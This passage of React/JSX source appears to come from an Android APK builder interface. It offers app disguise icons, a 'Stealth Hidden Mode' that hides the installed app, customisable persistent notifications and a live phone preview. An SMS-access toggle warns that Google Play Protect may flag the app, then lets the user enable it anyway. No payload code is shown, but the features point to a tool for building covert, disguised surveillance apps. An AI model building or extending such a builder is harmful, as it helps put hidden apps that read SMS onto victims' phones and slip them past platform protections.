                                            <label className="block text-xs font-bold uppercase tracking-widest text-fg-3 mb-2.5">
                                                Persistent Background Notification Style
                                            </label>
                                            <div className="grid grid-cols-2 sm:grid-cols-3 gap-2.5">
                                                {Object.entries(NOTIFICATION_PRESETS).map(([key, preset]) => (
                                                    <button
                                                        key={key}
                                                        type="button"
                                                        onClick={() => {
                                                            setNotificationStyle(key);
                                                            if (key !== 'custom') {
                                                                setNotificationTitle(preset.title);
                                                                setNotificationText(preset.text);
                                                            }
                                                        }}
                                                        className={`p-3 rounded-xl border text-left transition-all ${
                                                            notificationStyle === key
                                                                ? 'bg-emerald-500/10 border-emerald-500 shadow-sm'
                                                                : 'bg-black/40 border-white/5 hover:border-white/20'
                                                        }`}
                                                    >
                                                        <div className="flex items-center gap-2 mb-1">
                                                            <span className="text-sm">{preset.icon}</span>
                                                            <span className="text-xs font-bold text-white truncate">{preset.title}</span>
                                                        </div>
                                                        <span className="text-[11px] text-fg-3 block truncate">{preset.text}</span>
                                                    </button>
                                                ))}
                                            </div>
                                        </div>

                                        {/* Notification Title & Text Customizer */}
                                        <div className="p-4 rounded-2xl bg-black/40 border border-white/10 space-y-4">
                                            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                                                <div>
                                                    <label className="block text-xs font-bold text-fg-2 mb-1.5">Notification Title</label>
                                                    <input
                                                        type="text"
                                                        value={notificationTitle}
                                                        onChange={(e) => setNotificationTitle(e.target.value)}
                                                        className="w-full bg-black/50 border border-white/10 rounded-xl px-3.5 py-2 text-sm text-white font-semibold focus:outline-none focus:border-emerald-500"
                                                    />
                                                </div>
                                                <div>
                                                    <label className="block text-xs font-bold text-fg-2 mb-1.5">Notification Message</label>
                                                    <input
                                                        type="text"
                                                        value={notificationText}
                                                        onChange={(e) => setNotificationText(e.target.value)}
                                                        className="w-full bg-black/50 border border-white/10 rounded-xl px-3.5 py-2 text-sm text-white focus:outline-none focus:border-emerald-500"
                                                    />
                                                </div>
                                            </div>

                                            <div>
                                                <label className="block text-xs font-bold text-fg-2 mb-1.5">When User Taps Notification</label>
                                                <select
                                                    value={notificationClickAction}
                                                    onChange={(e) => setNotificationClickAction(e.target.value)}
                                                    className="w-full bg-black/50 border border-white/10 rounded-xl px-3.5 py-2 text-sm text-white focus:outline-none focus:border-emerald-500"
                                                >
                                                    {Object.entries(CLICK_ACTIONS).map(([key, label]) => (
                                                        <option key={key} value={key} className="bg-[#121316] text-white">{label}</option>
                                                    ))}
                                                </select>
                                            </div>
                                        </div>
                                    </div>
                                )}
                            </div>

                            {/* Footer Action Bar */}
                            <div className="flex items-center justify-between p-5 border-t border-white/10 bg-[#121318]">
                                <div className="text-xs text-fg-3 hidden sm:block">
                                    Ready to compile APK for <span className="font-bold text-white">{appName}</span>
                                </div>
                                <div className="flex items-center gap-3 w-full sm:w-auto">
                                    <button
                                        type="button"
                                        onClick={onClose}
                                        className="flex-1 sm:flex-none px-5 py-3 rounded-xl bg-white/5 hover:bg-white/10 text-white font-semibold text-xs transition-colors"
                                    >
                                        Cancel
                                    </button>
                                    <button
                                        type="button"
                                        onClick={startGeneration}
                                        className="flex-1 sm:flex-none px-6 py-3 rounded-xl bg-gradient-to-r from-emerald-500 to-teal-500 hover:from-emerald-400 hover:to-teal-400 text-black font-extrabold text-xs shadow-[0_0_20px_rgba(16,185,129,0.3)] flex items-center justify-center gap-2 transition-all"
                                    >
                                        <Download size={15} /> Build & Download APK
                                    </button>
                                </div>
                            </div>
                        </div>

                        {/* RIGHT COLUMN: REALISTIC PHONE SIMULATOR PREVIEW */}
                        <div className="w-full lg:w-[380px] bg-[#0c0d10] p-6 flex flex-col items-center justify-center border-t lg:border-t-0 border-white/10">
                            <div className="w-full mb-3 flex items-center justify-between">
                                <span className="text-xs font-bold text-fg-3 uppercase tracking-widest">Live Android Preview</span>
                                <span className="text-[10px] text-emerald-400 font-semibold flex items-center gap-1.5">
                                    <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-ping" />
                                    Dynamic Mockup
                                </span>
                            </div>

                            {/* Realistic Smartphone Frame */}
                            <div className="relative w-full max-w-[280px] h-[520px] rounded-[2.8rem] bg-[#14151a] border-[6px] border-[#252730] shadow-[0_20px_60px_rgba(0,0,0,0.8)] flex flex-col overflow-hidden">
                                
                                {/* Phone Top Status Bar */}
                                <div className="flex items-center justify-between px-6 pt-3 pb-2 text-[10px] font-bold text-white/80 bg-black/40">
                                    <span>09:41</span>
                                    <div className="w-16 h-4 bg-black rounded-full absolute top-2.5 left-1/2 -translate-x-1/2" />
                                    <div className="flex items-center gap-1.5">
                                        <span>5G</span>
                                        <span>100%</span>
                                    </div>
                                </div>

                                {/* Phone Screen Content */}
                                <div className="flex-1 flex flex-col justify-between p-4 bg-gradient-to-b from-[#181a22] to-[#101116] overflow-hidden">
                                    
                                    {/* App Launcher / Home Screen View */}
                                    <div className="mt-8 flex flex-col items-center justify-center space-y-3">
                                        <div className={`w-20 h-20 rounded-[1.6rem] bg-gradient-to-br ${currentPreset.iconBg} flex items-center justify-center ${currentPreset.iconColor} shadow-[0_15px_30px_rgba(0,0,0,0.5)] border border-white/20 transition-all duration-300`}>
                                            {selectedDisguise === 'custom' && customIconPreview ? (
                                                <img src={customIconPreview} alt="App Icon" className="w-16 h-16 rounded-2xl object-cover" />
                                            ) : (
                                                renderDisguiseGraphic(selectedDisguise, "w-10 h-10")
                                            )}
                                        </div>
                                        <div className="text-center">
                                            <h4 className="font-extrabold text-white text-base truncate max-w-[200px]">{appName}</h4>
                                            <p className="text-[10px] text-fg-3 font-data truncate max-w-[200px]">{packageName}</p>
                                        </div>

                                        {hideApp && (
                                            <div className="px-3 py-1 rounded-full bg-amber-500/10 border border-amber-500/30 text-amber-300 text-[10px] font-bold flex items-center gap-1.5">
                                                <Eye size={12} /> Stealth Hidden Mode
                                            </div>
                                        )}
                                    </div>

                                    {/* Live Android Notification Banner Mockup */}
                                    <div className="w-full bg-[#1e2029]/95 backdrop-blur-md border border-white/10 rounded-2xl p-3.5 shadow-2xl space-y-2">
                                        <div className="flex items-center justify-between text-[10px] text-white/50">
                                            <div className="flex items-center gap-1.5 font-bold">
                                                <span className="text-emerald-400">●</span>
                                                <span>{NOTIFICATION_PRESETS[notificationStyle]?.title || appName}</span>
                                            </div>
                                            <span>now</span>
                                        </div>
                                        <div>
                                            <p className="text-xs font-bold text-white">{notificationTitle}</p>
                                            <p className="text-[11px] text-white/70 leading-snug mt-0.5">{notificationText}</p>
                                        </div>
                                        <div className="pt-1.5 border-t border-white/5 flex items-center justify-between text-[10px] text-fg-3">
                                            <span>Action: {CLICK_ACTIONS[notificationClickAction]?.split(' ')[0]}</span>
                                            <span className="text-emerald-400 font-bold">PERSISTENT</span>
                                        </div>
                                    </div>
                                </div>

                                {/* Phone Bottom Home Indicator */}
                                <div className="py-2 flex justify-center bg-black/40">
                                    <div className="w-24 h-1 rounded-full bg-white/30" />
                                </div>
                            </div>
                        </div>
                    </div>
                )}

                {/* Play Protect Warning Dialog */}
                {showPlayProtectWarning && (
                    <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-[300]" onClick={() => setShowPlayProtectWarning(false)}>
                        <div className="bg-[#181216] rounded-3xl p-6 max-w-sm mx-4 border border-red-500/40 shadow-2xl space-y-4" onClick={(e) => e.stopPropagation()}>
                            <div className="flex items-center gap-3">
                                <div className="w-11 h-11 rounded-xl bg-red-500/15 border border-red-500/30 flex items-center justify-center text-red-400">
                                    <AlertTriangle size={22} />
                                </div>
                                <div>
                                    <h3 className="text-base font-bold text-white">Play Protect Notice</h3>
                                    <p className="text-xs text-red-400">High Risk SMS Permission</p>
                                </div>
                            </div>
                            <p className="text-xs text-fg-2 leading-relaxed">
                                Enabling <strong className="text-white">SMS Access</strong> increases the likelihood that Google Play Protect will flag the app during installation.
                            </p>
                            <div className="flex gap-3 pt-2">
                                <button
                                    type="button"
                                    onClick={() => setShowPlayProtectWarning(false)}
                                    className="flex-1 py-2.5 rounded-xl bg-white/5 hover:bg-white/10 text-white font-semibold text-xs transition-colors"
                                >
                                    Cancel
                                </button>
                                <button
                                    type="button"
                                    onClick={() => {
                                        setEnableSmsPermission(true);
                                        setShowPlayProtectWarning(false);
                                    }}
                                    className="flex-1 py-2.5 rounded-xl bg-red-500 hover:bg-red-600 text-white font-bold text-xs shadow-[0_0_15px_rgba(239,68,68,0.3)] transition-colors"
                                >
                                    Enable SMS
                                </button>
                            </div>
                        </div>
                    </div>
                )}

                {/* Alert Modal */}
                <CustomAlertModal
                    isOpen={showCustomAlert}
                    onClose={() => setShowCustomAlert(false)}
                    title={alertData.title}
                    message={alertData.message}
                    type={alertData.type}
                />
            </div>
        </div>
    );
}
